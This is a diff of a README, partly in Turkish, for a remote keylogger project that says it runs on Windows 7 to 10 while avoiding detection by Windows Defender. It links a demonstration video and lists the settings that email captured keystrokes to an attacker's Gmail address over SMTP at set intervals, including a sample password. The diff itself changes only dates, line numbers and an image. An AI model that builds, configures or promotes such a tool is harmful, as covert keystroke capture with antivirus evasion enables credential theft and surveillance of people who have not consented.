@@ -1,7 +1,7 @@
 # Gngr_remote_keylogger
-(On 07/04/2021) Remote Keylogger software has been made for the latest up-to-date "Windows 10" operating system. It managed to circumvent the "Windows Defender" program.
+(On 09/04/2021) Remote Keylogger software has been made for the latest up-to-date "Windows 10" operating system. It managed to circumvent the "Windows Defender" program.
 
-(Windows 7, 8, 10 gibi) Güncel Windows işletim sistemlerinde çalışan ve Defender gibi güvenlik programlarına yakalanmayan "Remote keylogger" programı yazılması hedeflenmiştir. 07/04/2021 tarihi itibarıyla gerçekleştirilmiştir. Güncellemelerle beraber zamanla bu durum değişebilir.
+(Windows 7, 8, 10 gibi) Güncel Windows işletim sistemlerinde çalışan ve Defender gibi güvenlik programlarına yakalanmayan "Remote keylogger" programı yazılması hedeflenmiştir. 09/04/2021 tarihi itibarıyla gerçekleştirilmiştir. Güncellemelerle beraber zamanla bu durum değişebilir.
 
 Kaynak kodun derlenmiş çalışır hali ile ilgili video https://www.youtube.com/watch?v=7zq-eTPeRbY adresinden izlenebilir.
 
@@ -59,7 +59,7 @@ SMTP_Email.py ==> Email göndermek için kullanılacak sınıfları içerir.
 
 Kaynak Kod Ayarları
 ---------------------
-"keylogger.py" dosyasında 94. ve 99. satırlar arasında bulunan değişkenler, gerekli şekilde ayarlanmalıdır.
+"keylogger.py" dosyasında 105. ve 110. satırlar arasında bulunan değişkenler, gerekli şekilde ayarlanmalıdır.
     
     SEND_MAIL_SECOND = 60                           # Gönderilecek e-mail süre aralığı, (varsayılan 60 sn)
     SMTP_ADDR = 'smtp.gmail.com'                    # SMTP Adresi
@@ -68,8 +68,8 @@ Kaynak Kod Ayarları
     PASSWORD = 'q123aSd456z'                        # SMTP ayarları yapılmış e-mail adresinin şifresi
     MAIL_TO = 'receiver.test.gungor.abc@gmail.com'  # E-mail gönderilecek adres (SMTP ayarları yapılmış olan e-mail olabileceği gibi farklı e-mail adresi de yazılabilir.)
     
+![n5](https://user-images.githubusercontent.com/71177413/114186529-a3880a80-994f-11eb-9d78-76f6d8f8774a.JPG)
 
-![n4](https://user-images.githubusercontent.com/71177413/114180074-6b30fe00-9948-11eb-8f6f-07dbe24ff5d2.png)
 
     
 Önemli Notlar
